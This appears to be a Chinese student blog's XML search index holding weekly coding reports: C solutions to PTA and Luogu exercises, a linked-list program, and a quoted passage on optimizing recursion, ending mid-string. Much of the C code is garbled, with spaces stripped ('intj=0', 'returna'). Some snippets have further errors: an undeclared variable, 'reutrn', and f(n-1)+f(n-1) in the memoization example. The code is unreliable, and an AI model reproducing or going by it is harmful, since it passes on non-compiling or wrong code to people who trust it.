<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019.11.25-2019.11.30</title>
    <url>/32145.html</url>
    <content><![CDATA[<h2 id="1-PTA-寻找完美数">1.PTA-寻找完美数</h2>
<p><img src="https://img-blog.csdnimg.cn/20191129134009445.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="题目如图"></p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(inti)</span></span>&#123;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	intn=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(intk=<span class="number">2</span>;k&lt;i;k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			n=n+k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inta=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==i&amp;&amp;i!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">		a=<span class="number">1</span>;</span><br><span class="line">		returna;</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	inta,b;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	<span class="keyword">for</span>(inti=a;i&lt;=b;i++)&#123;</span><br><span class="line">		j=judge(i);</span><br><span class="line">		<span class="keyword">if</span>(j==<span class="number">1</span>)&#123;</span><br><span class="line">			c=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(c!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是第一次提交的，结果只对了一个，其他都是格式错误，感觉应该是结尾不能有空格，就将 main 函数里的参数 c 传入 judge 函数，判断输出的是否是第一个完美数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(inti,intc)</span></span>&#123;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	intn=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(intk=<span class="number">2</span>;k&lt;i;k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			n=n+k+i/k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inta=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==i&amp;&amp;i!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(c==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">		a=<span class="number">1</span>;</span><br><span class="line">		returna;</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二次提交的时候有一个测试点没有通过，猜测是 i 太大的时候超时了，于是把 judge 函数里循环的循环条件改为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">k&lt;<span class="built_in">sqrt</span>(i)</span><br></pre></td></tr></table></figure>
<p>就通过了。</p>
<p>##2.PTA-验证“哥德巴赫猜想”<br>
<img src="https://img-blog.csdnimg.cn/20191129234420522.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line">intprime(intq)&#123;</span><br><span class="line">	inti=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(;i&lt;q;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(q%i==<span class="number">0</span>)&#123;</span><br><span class="line">			return0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(q==i)&#123;</span><br><span class="line">		return1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	intm;</span><br><span class="line">	m=<span class="built_in">sqrt</span>(n)+<span class="number">1</span>;</span><br><span class="line">	inta;</span><br><span class="line">	intta1;</span><br><span class="line">	intta2;</span><br><span class="line">	<span class="keyword">for</span>(intp=<span class="number">2</span>;p&lt;n/<span class="number">2</span>;p++)&#123;</span><br><span class="line">		ta1=<span class="number">0</span>;</span><br><span class="line">		ta2=<span class="number">0</span>;</span><br><span class="line">		a=n-p;</span><br><span class="line">		<span class="keyword">if</span>(prime(p)==<span class="number">0</span>)	<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span>(prime(a)==<span class="number">0</span>)	<span class="keyword">continue</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d=%d+%d&quot;</span>,n,p,a);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次提交的时候长这样，依旧是最大 N 的时候运行超时，想了好久不知道怎么改，上网搜了一下：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0YXJpbHkvYXJ0aWNsZS9kZXRhaWxzLzc4NTU3NjQ5">7-6 验证“哥德巴赫猜想”（20 分）<i class="fa fa-external-link-alt"></i></span>得到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prime</span><span class="params">(intn)</span></span>&#123;</span><br><span class="line"><span class="comment">//判断n为偶数时</span></span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">		return1;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n&lt;<span class="number">2</span>||n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//判断n为奇数时</span></span><br><span class="line">	<span class="keyword">for</span>(inti=<span class="number">3</span>;i*i&lt;=n;i=i+<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line">			return0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">4</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;4=2+2&quot;</span>);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(inti=<span class="number">2</span>;i&lt;n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(prime(i)&amp;&amp;prime(n-i))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d=%d+%d&quot;</span>,n,i,n-i);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-洛谷-P2089-烤鸡">3.洛谷-P2089 烤鸡</h2>
<p><img src="https://img-blog.csdnimg.cn/201911300913530.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
只想到了这个方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">if</span>(n&gt;<span class="number">30</span>||n&lt;<span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">	intcnt=<span class="number">0</span>;</span><br><span class="line">	inta,b,c,d,e,f,g,h,i,j;</span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">1</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">		<span class="keyword">for</span>(b=<span class="number">1</span>;b&lt;=<span class="number">3</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(c=<span class="number">1</span>;c&lt;=<span class="number">3</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(d=<span class="number">1</span>;d&lt;=<span class="number">3</span>;d++)</span><br><span class="line">					<span class="keyword">for</span>(e=<span class="number">1</span>;e&lt;=<span class="number">3</span>;e++)</span><br><span class="line">						<span class="keyword">for</span>(f=<span class="number">1</span>;f&lt;=<span class="number">3</span>;f++)</span><br><span class="line">							<span class="keyword">for</span>(g=<span class="number">1</span>;g&lt;=<span class="number">3</span>;g++)</span><br><span class="line">								<span class="keyword">for</span>(h=<span class="number">1</span>;h&lt;=<span class="number">3</span>;h++)</span><br><span class="line">									<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)</span><br><span class="line">										<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">											<span class="keyword">if</span>(a+b+c+d+e+f+g+h+i+j==n)</span><br><span class="line">												cnt++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">1</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">		<span class="keyword">for</span>(b=<span class="number">1</span>;b&lt;=<span class="number">3</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(c=<span class="number">1</span>;c&lt;=<span class="number">3</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(d=<span class="number">1</span>;d&lt;=<span class="number">3</span>;d++)</span><br><span class="line">					<span class="keyword">for</span>(e=<span class="number">1</span>;e&lt;=<span class="number">3</span>;e++)</span><br><span class="line">						<span class="keyword">for</span>(f=<span class="number">1</span>;f&lt;=<span class="number">3</span>;f++)</span><br><span class="line">							<span class="keyword">for</span>(g=<span class="number">1</span>;g&lt;=<span class="number">3</span>;g++)</span><br><span class="line">								<span class="keyword">for</span>(h=<span class="number">1</span>;h&lt;=<span class="number">3</span>;h++)</span><br><span class="line">									<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)</span><br><span class="line">										<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">											<span class="keyword">if</span>(a+b+c+d+e+f+g+h+i+j==n)</span><br><span class="line">												<span class="built_in">printf</span>(<span class="string">&quot;%d%d%d%d%d%d%d%d%d%d\n&quot;</span>,a,b,c,d,e,f,g,h,i,j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然通过了但是觉得这样太傻了<br>
不过别人交的题解也没看懂…<br>
感觉这个方法挺特别的：<br>
<img src="https://img-blog.csdnimg.cn/20191130094135480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
##4.链表<br>
周二在 b 站上看了个讲解单链表的教程：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2NDE4MjAzP2Zyb209c2VhcmNoJnNlaWQ9OTQ4MjU4NDI5NTEyMTk1MzEzMg==">C 语言入门教程第 13 讲动态内存分配和链表<i class="fa fa-external-link-alt"></i></span>，跟着打了两遍，看代码理解了一遍，感觉还不是很懂，就尝试自己打了一下。<br>
然后顺便把教程里没说的删除弄出来了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">structstud&#123;</span><br><span class="line">	charname[<span class="number">10</span>];</span><br><span class="line">	structstud*next;</span><br><span class="line">&#125;;</span><br><span class="line">voidprint(structstud*p);</span><br><span class="line"><span class="function">structstud*<span class="title">remove</span><span class="params">(structstud*p)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">	structstud*current,*nextp,*head;</span><br><span class="line">	head=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line">	charstr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;typeaname：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="built_in">strcpy</span>(head-&gt;name,str);</span><br><span class="line">	current=head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	chara;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;keepdoing?\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">while</span>(a==<span class="string">&#x27;y&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;typeaname：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">		getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		nextp=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(nextp-&gt;name,str);</span><br><span class="line">		current-&gt;next=nextp;</span><br><span class="line">		current=nextp;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;keepdoing?\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	current-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	returnhead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">insert</span><span class="params">(structstud*p)</span></span>&#123;</span><br><span class="line">	structstud*insert,*current;</span><br><span class="line">	intposition;</span><br><span class="line">	charstr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;insertposition:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;position);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;typeaname:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	current=p;</span><br><span class="line">	insert=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line">	<span class="built_in">strcpy</span>(insert-&gt;name,str);</span><br><span class="line"></span><br><span class="line">	insert-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>(position!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(position&gt;<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			current=current-&gt;next;</span><br><span class="line">			position--;</span><br><span class="line">		&#125;<span class="comment">//current=insert-1;</span></span><br><span class="line">		insert-&gt;next=current-&gt;next;</span><br><span class="line">		current-&gt;next=insert;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		insert-&gt;next=current;</span><br><span class="line">		p=insert;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\npresentelement:\n&quot;</span>);</span><br><span class="line">	print(p);</span><br><span class="line">	returnp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intmain()&#123;</span><br><span class="line">	structstud*p;</span><br><span class="line">	p=build();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;presentelement:\n&quot;</span>);</span><br><span class="line">	print(p);</span><br><span class="line"></span><br><span class="line">	charb=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;insert?yorn&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(b!=<span class="string">&#x27;n&#x27;</span>)&#123;</span><br><span class="line">		p=insert(p);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;insert?yorn&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line"><span class="comment">//		getchar();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	charc;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;deleteaname?yorn&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;c);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(c!=<span class="string">&#x27;n&#x27;</span>)&#123;</span><br><span class="line">		p=remove(p);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;deleteaname?yorn&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;c);</span><br><span class="line">		getchar();</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">voidprint(structstud*p)&#123;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p-&gt;name);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p-&gt;name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">remove</span><span class="params">(structstud*p)</span></span>&#123;</span><br><span class="line">	structstud*position,*current=p;</span><br><span class="line">	intpo;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;place:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;po);</span><br><span class="line">	<span class="keyword">if</span>(po!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(po!=<span class="number">1</span>)&#123;</span><br><span class="line">			current=current-&gt;next;</span><br><span class="line">			po--;</span><br><span class="line">		&#125;</span><br><span class="line">		position=current;</span><br><span class="line">		position=position-&gt;next;</span><br><span class="line">		current-&gt;next=position-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		p=current-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(current);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;currentlist:\n&quot;</span>);</span><br><span class="line">	print(p);</span><br><span class="line">	returnp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.01-2019.12.07</title>
    <url>/34683.html</url>
    <content><![CDATA[<h2 id="1-洛谷-P1028-数的计算">1.洛谷-P1028 数的计算</h2>
<p><img src="https://img-blog.csdnimg.cn/2019120714254339.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>
<p>第一次写的时候大概思路：<img src="https://img-blog.csdnimg.cn/20191207142716854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n/<span class="number">2</span>; i++)</span><br><span class="line">		sum=sum+cal(i);</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,cal(n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果有15个超时了。<br>
前几天看别人的题解没看懂，打算写完周报再看一下。</p>
<h2 id="2-递归优化">2.递归优化</h2>
<blockquote>
<p>有关递归的一些优化思路1. 考虑是否重复计算告诉你吧，如果你使用递归的时候不进行优化，是有非常非常非常多的子问题被重复计算的。 啥是子问题？ f(n-1),f(n-2)…就是 f(n) 的子问题了。例如对于案例2那道题，f(n) = f(n-1) + f(n-2)。递归调用的状态图如下：<img src="https://pic2.zhimg.com/v2-32f657a7a8e409a130f196fc34948291_b.jpg" data-caption="" data-size="normal" data-rawwidth="729" data-rawheight="444" data-default-watermark-src="https://pic1.zhimg.com/v2-45ac6014f7b3cf95a66b50126b80a990_b.jpg" class="origin_image zh-lightbox-thumb" width="729" data-original="https://pic2.zhimg.com/v2-32f657a7a8e409a130f196fc34948291_r.jpg"/>看到没有，递归计算的时候，重复计算了两次 f(5)，五次 f(4)。。。。这是非常恐怖的，n 越大，重复计算的就越多，所以我们必须进行优化。如何优化？一般我们可以把我们计算的结果保证起来，例如把 f(4) 的计算结果保证起来，当再次要计算 f(4) 的时候，我们先判断一下，之前是否计算过，如果计算过，直接把 f(4) 的结果取出来就可以了，没有计算过的话，再递归计算。用什么保存呢？可以用数组或者 HashMap 保存，我们用数组来保存把，把 n 作为我们的数组下标，f(n) 作为值，例如 arr[n] = f(n)。f(n) 还没有计算过的时候，我们让 arr[n] 等于一个特殊值，例如 arr[n] = -1。当我们要判断的时候，如果 arr[n] = -1，则证明 f(n) 没有计算过，否则， f(n) 就已经计算过了，且 f(n) = arr[n]。直接把值取出来就行了。代码如下：// 我们实现假定 arr 数组已经初始化好的了。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//先判断有没计算过</span></span><br><span class="line">    <span class="keyword">if</span>(arr[n] != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">//计算过，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> arr[n];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 没有计算过，递归计算,并且把结果保存到 arr数组里</span></span><br><span class="line">        arr[n] = f(n<span class="number">-1</span>) + f(n<span class="number">-1</span>);</span><br><span class="line">        reutrn arr[n];</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也就是说，使用递归的时候，必要 须要考虑有没有重复计算，如果重复计算了，一定要把计算过的状态保存起来。2. 考虑是否可以自底向上对于递归的问题，我们一般都是从上往下递归的，直到递归到最底，再一层一层着把值返回。不过，有时候当 n 比较大的时候，例如当 n = 10000 时，那么必须要往下递归10000层直到 n &lt;=1 才将结果慢慢返回，如果n太大的话，可能栈空间会不够用。对于这种情况，其实我们是可以考虑自底向上的做法的。例如我知道f(1) = 1;f(2) = 2;那么我们就可以推出 f(3) = f(2) + f(1) = 3。从而可以推出f(4),f(5)等直到f(n)。因此，我们可以考虑使用自底向上的方法来取代递归，代码如下：</p>
</blockquote>
<figure class="highlight plaintext"><figcaption><span>int f(int n) &#123;</span></figcaption><table><tr><td class="code"><pre><span class="line">public int f(int n) &#123;</span><br><span class="line">       if(n &lt;= 2)</span><br><span class="line">           return n;</span><br><span class="line">       int f1 = 1;</span><br><span class="line">       int f2 = 2;</span><br><span class="line">       int sum = 0;</span><br><span class="line">       for (int i = 3; i &lt;= n; i++) &#123;</span><br><span class="line">           sum = f1 + f2;</span><br><span class="line">           f1 = f2;</span><br><span class="line">           f2 = sum;</span><br><span class="line">       &#125;</span><br><span class="line">       return sum;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这种方法，其实也被称之为递推。<br>
作者：帅地<br>
链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMxNDEyNDM2L2Fuc3dlci82ODM4MjA3NjU=">https://www.zhihu.com/question/31412436/answer/683820765<i class="fa fa-external-link-alt"></i></span><br>
来源：知乎<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h2 id="2-链表的查找">2.链表的查找</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct stud *p)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stud</span> *<span class="title">p1</span>=</span>p;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;find:1.num or 2.name?   &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(num==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;type a name:   